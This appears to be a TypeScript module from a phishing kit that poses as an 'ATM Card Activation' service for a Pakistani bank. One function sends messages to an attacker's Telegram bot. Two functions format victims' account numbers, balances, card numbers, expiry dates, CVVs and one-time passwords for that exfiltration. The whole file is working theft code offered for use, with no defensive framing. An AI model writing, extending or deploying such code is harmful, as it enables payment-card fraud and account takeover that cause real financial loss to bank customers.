const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID

export async function sendToTelegram(message: string) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!response.ok) {
      throw new Error("Failed to send message to Telegram")
    }

    return await response.json()
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    throw error
  }
}

export function formatCardDataMessage(data: {
  accountNumber: string
  currentBalance: string
  cardNumber?: string
  expiryDate?: string
  cvv?: string
}) {
  return `
🏧 <b>ATM Card Activation - Card Details</b>

📱 <b>Account Number:</b> ${data.accountNumber}
💰 <b>Current Balance:</b> PKR ${data.currentBalance}
${data.cardNumber ? `💳 <b>Card Number:</b> ${data.cardNumber}` : ""}
${data.expiryDate ? `📅 <b>Expiry Date:</b> ${data.expiryDate}` : ""}
${data.cvv ? `🔐 <b>CVV:</b> ${data.cvv}` : ""}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
  `.trim()
}

export function formatOTPMessage(otp: string, accountNumber: string) {
  return `
🔐 <b>ATM Card Activation - OTP Received</b>

📱 <b>Account Number:</b> ${accountNumber}
🔑 <b>OTP Code:</b> ${otp}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
  `.trim()
}
